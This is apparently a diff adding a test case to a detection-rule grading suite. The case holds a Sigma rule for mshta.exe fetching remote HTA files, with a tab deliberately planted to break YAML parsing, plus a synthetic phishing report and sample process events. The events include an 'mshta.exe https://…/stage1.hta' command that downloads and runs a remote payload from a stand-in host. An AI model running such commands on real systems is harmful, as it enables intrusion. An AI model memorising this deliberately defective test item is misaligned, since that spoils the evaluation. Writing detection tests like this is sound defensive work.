@@ -1,0 +1,83 @@
+id: D1-01
+role: defective
+defect_class: D1
+evasive: true
+why: One line inside the detection block is indented with a tab character, which looks identical to spaces
+  but is forbidden for YAML indentation, so the document fails to parse. With the tab replaced by spaces
+  the rule would be valid and fully traceable.
+expected_gate: G1
+report_text: During the intrusion at a regional logistics firm, a phishing attachment opened in Microsoft
+  Word spawned Microsoft's HTML Application host to retrieve a remote payload. The process tree shows
+  WINWORD.EXE starting mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta on a finance workstation.
+  The HTA held a short VBScript stub that in turn started a hidden PowerShell process. Analysts noted
+  that mshta.exe was invoked with a full HTTPS URL as its only argument rather than a path to a local
+  file, which is unusual for the hosts involved because the finance department has no business use for
+  HTA applications. The identical pattern recurred on three workstations within eleven minutes, each time
+  with a different staging filename but the same HTTPS delivery host.
+evidence:
+- mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta
+- mshta.exe was invoked with a full HTTPS URL as its only argument
+logsource: windows_process_creation
+techniques:
+- T1218.005
+sigma_yaml: "title: Mshta Launching Remote HTA Over HTTPS\nid: 6f3b1c2e-8a47-4d19-b0c5-2e91a7d4f830\n\
+  status: experimental\ndescription: Detects mshta.exe started with an HTTPS URL as its argument, as seen\
+  \ when a phishing macro retrieved a remote HTA payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\n\
+  date: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: process_creation\n\
+  \  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n  \tCommandLine|contains:\
+  \ 'https://'\n  condition: selection\nfalsepositives:\n  - Internal administration tools delivered as\
+  \ HTML applications from an intranet web server\nlevel: high\n"
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n C:\Users\bkim\Documents\invoice_0932.docm
+    user: LAB\bkim
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe https://cdn.harborfreight-docs.test/inv/stage2.hta
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n C:\Users\mnovak\Documents\statement_1187.docm
+    user: LAB\mnovak
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\Documents\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe "C:\Program Files\Northwind HR\help\welcome.hta"
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
